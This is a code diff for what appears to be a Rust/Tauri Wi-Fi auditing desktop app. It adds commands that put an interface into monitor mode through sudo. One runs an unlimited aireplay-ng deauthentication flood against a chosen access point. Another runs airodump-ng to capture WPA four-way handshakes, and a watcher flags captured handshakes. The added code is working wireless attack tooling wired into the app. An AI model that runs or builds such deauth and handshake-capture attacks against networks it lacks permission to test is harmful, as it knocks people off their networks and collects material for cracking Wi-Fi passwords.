@@ -4,9 +4,12 @@
 // unavailable so the UI can switch to preview mode.
 
 use serde::Serialize;
+use std::collections::HashMap;
 use std::io::{BufRead, BufReader};
-use std::process::{Command, Stdio};
-use tauri::{AppHandle, Emitter};
+use std::process::{Child, Command, Stdio};
+use std::sync::Mutex;
+use std::time::Duration;
+use tauri::{AppHandle, Emitter, State};
 
 #[derive(Serialize)]
 pub struct SystemInfo {
@@ -1002,10 +1005,237 @@ fn install_tools(app: AppHandle, targets: Vec<String>) -> Result<(), String> {
     Ok(())
 }
 
+// --------------------------------------------------------------------------- //
+// Live attacks (managed aireplay-ng / airodump-ng processes)
+//
+// Each attack is a background process keyed by a job id ("deauth", "capture").
+// Output streams to the frontend as `attack-log` events; `attack-exit` fires
+// when the process ends; `handshake-captured` fires when a 4-way handshake is
+// found in a capture. Privileged tools run via `sudo -n` when not already root.
+// --------------------------------------------------------------------------- //
+
+#[derive(Default)]
+struct AttackState(Mutex<HashMap<String, Child>>);
+
+/// Run a short privileged helper command (sudo -n when not root).
+fn sudo_sh(args: &[&str]) -> Option<String> {
+    if args.is_empty() {
+        return None;
+    }
+    if is_root() {
+        sh(args[0], &args[1..])
+    } else {
+        let mut a: Vec<&str> = vec!["-n"];
+        a.extend_from_slice(args);
+        sh("sudo", &a)
+    }
+}
+
+/// Put an interface into monitor mode on a given channel, without airmon-ng
+/// (keeps the interface name stable) and without killing NetworkManager
+/// globally (we only tell it to ignore this interface).
+fn ensure_monitor(iface: &str, channel: u32) -> Result<(), String> {
+    let _ = sudo_sh(&["nmcli", "dev", "set", iface, "managed", "no"]);
+    sudo_sh(&["ip", "link", "set", iface, "down"])
+        .ok_or_else(|| "could not bring the interface down (need root?)".to_string())?;
+    sudo_sh(&["iw", "dev", iface, "set", "type", "monitor"])
+        .ok_or_else(|| "could not set monitor mode (need root?)".to_string())?;
+    let _ = sudo_sh(&["ip", "link", "set", iface, "up"]);
+    if channel > 0 {
+        let ch = channel.to_string();
+        let _ = sudo_sh(&["iw", "dev", iface, "set", "channel", &ch]);
+    }
+    Ok(())
+}
+
+/// Spawn a long-running tool, streaming stdout/stderr as `attack-log` events
+/// tagged with the job id; emits `attack-exit` when stdout closes.
+fn spawn_streamed(
+    app: &AppHandle,
+    job: &str,
+    program: &str,
+    args: &[&str],
+) -> Result<Child, String> {
+    let prog = which(program).unwrap_or_else(|| program.to_string());
+    let mut cmd = if is_root() {
+        let mut c = Command::new(&prog);
+        c.args(args);
+        c
+    } else {
+        let sudo = which("sudo").unwrap_or_else(|| "sudo".into());
+        let mut c = Command::new(sudo);
+        c.arg("-n").arg(&prog).args(args);
+        c
+    };
+    cmd.env("PATH", augmented_path())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped());
+    let mut child = cmd
+        .spawn()
+        .map_err(|e| format!("failed to start {program}: {e}"))?;
+
+    for (pipe, is_out) in [
+        (child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), true),
+        (child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), false),
+    ] {
+        if let Some(p) = pipe {
+            let a = app.clone();
+            let j = job.to_string();
+            std::thread::spawn(move || {
+                for line in BufReader::new(p).lines().map_while(Result::ok) {
+                    let _ = a.emit("attack-log", serde_json::json!({ "job": j, "line": line }));
+                }
+                if is_out {
+                    let _ = a.emit("attack-exit", serde_json::json!({ "job": j }));
+                }
+            });
+        }
+    }
+    Ok(child)
+}
+
+/// Does the capture file contain at least one captured handshake?
+/// aircrack-ng lists each network's "(N handshake)" count; reading a file is
+/// unprivileged.
+fn cap_has_handshake(cap: &str) -> bool {
+    let prog = which("aircrack-ng").unwrap_or_else(|| "aircrack-ng".into());
+    let out = Command::new(prog)
+        .arg(cap)
+        .env("PATH", augmented_path())
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output();
+    if let Ok(o) = out {
+        let s = String::from_utf8_lossy(&o.stdout);
+        for seg in s.split('(') {
+            if seg.contains("handshake") {
+                let n: u32 = seg
+                    .chars()
+                    .take_while(|c| c.is_ascii_digit())
+                    .collect::<String>()
+                    .parse()
+                    .unwrap_or(0);
+                if n >= 1 {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+#[tauri::command]
+fn start_deauth(
+    app: AppHandle,
+    state: State<AttackState>,
+    iface: String,
+    bssid: String,
+    channel: u32,
+) -> Result<(), String> {
+    ensure_monitor(&iface, channel)?;
+    let _ = app.emit(
+        "attack-log",
+        serde_json::json!({ "job": "deauth", "line": format!("aireplay-ng --deauth 0 -a {bssid} {iface} (ch {channel})") }),
+    );
+    let child = spawn_streamed(
+        &app,
+        "deauth",
+        "aireplay-ng",
+        &["--deauth", "0", "-a", &bssid, &iface],
+    )?;
+    state.0.lock().unwrap().insert("deauth".into(), child);
+    Ok(())
+}
+
+#[tauri::command]
+fn start_capture(
+    app: AppHandle,
+    state: State<AttackState>,
+    iface: String,
+    bssid: String,
+    channel: u32,
+) -> Result<String, String> {
+    ensure_monitor(&iface, channel)?;
+    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
+    let dir = format!("{home}/wazfi-captures");
+    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    let prefix = format!("{dir}/hs_{}_{ts}", bssid.replace(':', ""));
+    let cap = format!("{prefix}-01.cap");
+    let ch = channel.to_string();
+
+    let _ = app.emit(
+        "attack-log",
+        serde_json::json!({ "job": "capture", "line": format!("airodump-ng -c {channel} --bssid {bssid} -w {prefix} {iface}") }),
+    );
+    let child = spawn_streamed(
+        &app,
+        "capture",
+        "airodump-ng",
+        &["-c", &ch, "--bssid", &bssid, "-w", &prefix, &iface],
+    )?;
+    state.0.lock().unwrap().insert("capture".into(), child);
+
+    // Watch the capture file for a handshake.
+    let a = app.clone();
+    let capf = cap.clone();
+    std::thread::spawn(move || {
+        for _ in 0..180 {
+            std::thread::sleep(Duration::from_secs(4));
+            if std::path::Path::new(&capf).exists() && cap_has_handshake(&capf) {
+                let _ = a.emit(
+                    "attack-log",
+                    serde_json::json!({ "job": "capture", "line": format!("4-way handshake captured → {capf}") }),
+                );
+                let _ = a.emit("handshake-captured", serde_json::json!({ "file": capf }));
+                break;
+            }
+        }
+    });
+    Ok(cap)
+}
+
+#[tauri::command]
+fn stop_attack(state: State<AttackState>, job: String) -> Result<(), String> {
+    if let Some(mut child) = state.0.lock().unwrap().remove(&job) {
+        let _ = child.kill();
+        let _ = child.wait();
+    }
+    // The real tool may be a grandchild of sudo; signal it by name too.
+    let tool = match job.as_str() {
+        "deauth" => "aireplay-ng",
+        "capture" => "airodump-ng",
+        _ => "",
+    };
+    if !tool.is_empty() {
+        let _ = sudo_sh(&["pkill", "-TERM", "-x", tool]);
+    }
+    Ok(())
+}
+
+#[tauri::command]
+fn attack_status(state: State<AttackState>) -> Vec<String> {
+    let mut map = state.0.lock().unwrap();
+    let mut running = Vec::new();
+    map.retain(|k, child| match child.try_wait() {
+        Ok(Some(_)) => false,
+        _ => {
+            running.push(k.clone());
+            true
+        }
+    });
+    running
+}
+
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
         .plugin(tauri_plugin_opener::init())
+        .manage(AttackState::default())
         .invoke_handler(tauri::generate_handler![
             get_system_info,
             list_interfaces,
@@ -1014,7 +1244,11 @@ pub fn run() {
             scan_networks,
             detect_usb_wifi,
             check_prereqs,
-            install_tools
+            install_tools,
+            start_deauth,
+            start_capture,
+            stop_attack,
+            attack_status
         ])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
